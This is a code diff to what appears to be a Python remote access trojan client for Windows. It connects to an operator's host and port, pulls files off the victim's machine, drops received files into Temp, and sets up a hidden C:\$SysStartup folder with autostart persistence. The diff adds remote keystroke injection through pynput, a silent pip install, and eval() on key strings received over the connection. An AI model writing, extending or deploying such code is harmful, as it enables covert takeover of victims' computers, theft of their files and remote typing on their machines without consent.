@@ -8,13 +8,20 @@ from os.path import exists
 import threading
 import pathlib
 
+try:
+    import pynput
+    from pynput.keyboard import Controller, Key
+except ModuleNotFoundError:
+    call(["pip", "install", "pynput"], shell=True)
+
 # change this to your ip and port:
-HOST = "10.0.0.5"
+HOST = ""
 PORT = 420
 # -----------------------------------------
 BUFFER = 4096
 FORMAT = "cp850"
 ADDR = (HOST, PORT)
+keyboard = Controller()
 
 # the script for autostart
 var = """import threading
@@ -75,6 +82,7 @@ def process(message):
             recvMsg()
     # accepts a sent file
     elif ctype == "f":
+
         # checks what type of file and what mode it uses
         msgNoType = message[1:]
         mode = msgNoType[3]
@@ -126,7 +134,35 @@ def process(message):
         else:
             call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
             sendMsg(name)
-    # installation procedure
+    # reveive keybinds
+    elif ctype == "k":
+        # checks if this is a keybind
+        if message[2] == "b":
+            message = message[4:]
+            keys = message.split(" ")
+            # presses all keys
+            for key in keys:
+                if key[0:3] == "Key":
+                    print(key)
+                    keyboard.press(eval(key))
+                else:
+                    keyboard.press(str(key))
+
+            # releases all keys
+            for release in keys:
+                if release[0:3] == "Key":
+                    keyboard.release(eval(release))
+                else:
+                    keyboard.release(str(release))
+
+            recvMsg()
+
+        else:
+            msg = message[4:]
+            keyboard.type(msg)
+            recvMsg()
+
+    # retreives given files
     elif ctype == "r":
         path = message[4:]
         if exists(path):
@@ -134,6 +170,7 @@ def process(message):
                 sendMsg(retreive.read())
         else:
             sendMsg("err")
+    # installation procedure
     elif ctype == "x":
         # creates the needed folders
         call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
